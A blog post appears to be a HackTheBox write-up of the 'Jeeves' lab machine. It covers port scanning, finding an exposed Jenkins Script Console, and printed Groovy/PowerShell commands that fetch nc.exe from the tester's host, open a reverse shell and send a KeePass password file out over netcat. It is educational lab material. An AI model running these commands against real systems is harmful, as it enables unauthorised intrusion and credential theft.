---
layout: post
title:  "HackTheBox Writeup: Jeeves"
date:   2018-03-15 00:00:00 -0400
categories: master
---

[[do intro]]

A quick port scan reveals that the following ports are open. We notice that port 50,000 is 
open, which is unusual.
```
root@kali:~# masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.63

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-03-15 23:22:43 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 50000/tcp on 10.10.10.63                                  
Discovered open port 80/tcp on 10.10.10.63                                     
Discovered open port 135/tcp on 10.10.10.63                                    
Discovered open port 445/tcp on 10.10.10.63 
```

Let's enumerate these ports a bit more with nmap:
```
root@kali:~# nmap -p80,135,445,50000 -sV -sS -T4 10.10.10.63 -v

Nmap scan report for 10.10.10.63
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```
So we see that port 50000 is running Jetty, which is a Java http server.
Let's quickly view port 80 in a web browser first.

![Port 80 web server](https://i.imgur.com/7skF1nf.png "Ask Jeeves on port 80")

Inputting any type of text leads to an error, or specifically, an image of an error.
![AskJeeves error](https://i.imgur.com/PAavAlF.png "Error upon input on Ask Jeeves")

There doesn't seem to be much else to do, and my instincts tell me that the real prize lies in 
port 50,000, so let's try that next. going to that port reveals a 404 error.

![Port 5000 Jetty HTTP Server](https://i.imgur.com/GZf8gNr.png "404 Error on Node, port 
50,000")

Not to be discouraged, and feeling that there's more than meets the eye, let's run dirbuster 
to find any interesting directories. Running dirbuster with 
`/usr/share/wordlists/dirbuster/directory-list-1.0.txt` reveals the 
/askjeeves/ directory, which has Jenkins running.

![Jenkins running on port 50000 in directory askjeeves](https://i.imgur.com/9y8W6pr.png 
"Jenkins running in directory askjeeves")

Under `Manage Jenkins` we see that there is a Script Console. We can use this to execute 
system commands using the general format `println("cmd.exe /c [command]".execute().text)`

![Running dir command using Jenkin's Script Console](https://i.imgur.com/etSU1Lk.png "Running 
dir command using Jenkin's Script Console")

To get an interactive shell, let's download nc.exe onto the machine using the command below, 
with the IP address modified to your own IP address:

`println("cmd.exe /c powershell -c (new-object 
System.Net.WebClient).DownloadFile('http://10.10.14.146/scripts/nc.exe','C:\\Users\\kohsuke\\Desktop\\nc.exe')".execute().text)`

The command below will give you a reverse shell on your machine:

`println("cmd.exe /c c:\\Users\\kohsuke\\Desktop\\nc.exe 10.10.14.146 4445 -e 
C:\\WINDOWS\\System32\\cmd.exe".execute().text)`

After looking around the filesystem, you should come across a `CEH.kdbx` file under 
`C:\Users\kohsuke\Documents`. This is a keepass file that contains a directory of passwords. 

To transfer this file from the Jeeves machine to our local machine, let's set up a netcat 
listener that will take the output and store it in a file:

`nc -nlvp 1234 > CEH.kdbx`

And in our reverse shell, the following command will take the contents of `CEH.kdbx` and send 
it 
to the listener we just set up:

`nc.exe -v 10.10.14.146 1234 < C:\Users\kohsuke\Documents\CEH.kdbx`



